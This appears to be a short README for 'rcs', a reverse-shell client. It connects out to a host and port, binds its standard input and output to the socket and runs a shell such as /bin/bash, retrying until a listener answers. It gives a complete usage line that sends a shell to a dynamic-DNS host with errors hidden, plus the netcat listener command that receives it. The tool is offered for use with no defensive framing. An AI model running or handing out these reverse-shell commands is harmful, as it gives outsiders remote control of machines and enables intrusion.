# rcs
Remote Client Shell

Process ('rcs') starts a conection. If any server responses, the client duplicate STDIN_FILENO, STDOUT_FILENO, and STDERR_FILENO and execve() a new process specified at 'rcs' parameters (maybe '/bin/bash').<br>
'rcs' connection request is able to retried (parameter) and sleep (parameter) at each connect() fails, waiting the server goes listenning.
 
<pre>
Usage: $ ./rcs &ltIP> &ltPORT> &ltSHELL> &ltN_RETRY_CONNECT> &ltRETRY_SECONDS>
  
$ ./rcs sample.noip.com 9988 '/bin/bash' 10 5 2>/dev/null
 
Remote (netcat) usage: nc -nvlp &ltPORT> 
  
$ nc -nvlp 9988
</pre>
